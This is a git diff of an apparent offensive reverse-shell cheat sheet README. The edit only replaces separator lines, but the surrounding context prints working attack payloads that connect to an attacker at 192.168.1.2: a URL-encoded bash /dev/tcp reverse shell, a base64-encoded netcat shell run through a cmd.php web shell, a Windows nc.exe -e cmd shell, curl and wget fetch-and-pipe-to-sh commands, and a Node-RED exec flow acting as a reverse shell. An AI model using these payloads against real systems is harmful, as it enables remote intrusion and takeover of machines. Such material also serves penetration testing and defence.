@@ -65,9 +65,7 @@
     * [<kbd>Listener Netcat</kbd>](#Windows-Listener-Netcat)
     * [<kbd>Listener Metasploit Multi Handler</kbd>](#Windows-Listener-Metasploit-Multi-Handler)
 
-  ---
- 
- <img src="https://github.com/d4t4s3c/Offensive-Reverse-Shell-Cheat-Sheet/blob/master/img/separator.png">
+  <img src="https://github.com/d4t4s3c/Offensive-Reverse-Shell-Cheat-Sheet/blob/master/img/separator.png">
  
   # <kbd>Bash</kbd>
  
@@ -109,7 +107,7 @@
   bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.2%2F443%200%3E%261%22
   ```
   
-  ---
+ <img src="https://github.com/d4t4s3c/Offensive-Reverse-Shell-Cheat-Sheet/blob/master/img/separator.png">
   
   # <kbd>Netcat</kbd>
   
@@ -183,7 +181,7 @@
   http://192.168.1.3/cmd.php?cmd=echo 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC4xLjIgNDQzID4vdG1wL2YK' |base64 -d |sh
   ```
 
-  ---
+ <img src="https://github.com/d4t4s3c/Offensive-Reverse-Shell-Cheat-Sheet/blob/master/img/separator.png">
   
   # <kbd>Netcat Windows</kbd>
   
@@ -195,7 +193,7 @@
   \\192.168.1.2\a\nc.exe -e cmd 192.168.1.2 443
   ```
   
-  ---
+  <img src="https://github.com/d4t4s3c/Offensive-Reverse-Shell-Cheat-Sheet/blob/master/img/separator.png">
   
   # <kbd>cURL</kbd>
  
@@ -208,7 +206,7 @@
   http://192.168.1.3/cmd.php?cmd=curl 192.168.1.2/index.html|sh
   ```
   
-  ---
+  <img src="https://github.com/d4t4s3c/Offensive-Reverse-Shell-Cheat-Sheet/blob/master/img/separator.png">
    
   # <kbd>Wget</kbd>
  
@@ -221,7 +219,7 @@
   http://192.168.1.3/cmd.php?cmd=wget -qO- 192.168.1.2/index.html|sh
   ```
   
-  ---
+ <img src="https://github.com/d4t4s3c/Offensive-Reverse-Shell-Cheat-Sheet/blob/master/img/separator.png">
   
   # <kbd>Node-RED</kbd>
   
@@ -229,7 +227,7 @@
   [{"id":"7235b2e6.4cdb9c","type":"tab","label":"Flow 1"},{"id":"d03f1ac0.886c28","type":"tcp out","z":"7235b2e6.4cdb9c","host":"","port":"","beserver":"reply","base64":false,"end":false,"name":"","x":786,"y":350,"wires":[]},{"id":"c14a4b00.271d28","type":"tcp in","z":"7235b2e6.4cdb9c","name":"","server":"client","host":"192.168.1.2","port":"443","datamode":"stream","datatype":"buffer","newline":"","topic":"","base64":false,"x":281,"y":337,"wires":[["4750d7cd.3c6e88"]]},{"id":"4750d7cd.3c6e88","type":"exec","z":"7235b2e6.4cdb9c","command":"","addpay":true,"append":"","useSpawn":"false","timer":"","oldrc":false,"name":"","x":517,"y":362.5,"wires":[["d03f1ac0.886c28"],["d03f1ac0.886c28"],["d03f1ac0.886c28"]]}]
   ```
  
-  ---
+ <img src="https://github.com/d4t4s3c/Offensive-Reverse-Shell-Cheat-Sheet/blob/master/img/separator.png">
  
   # <kbd>WebShell</kbd>
  
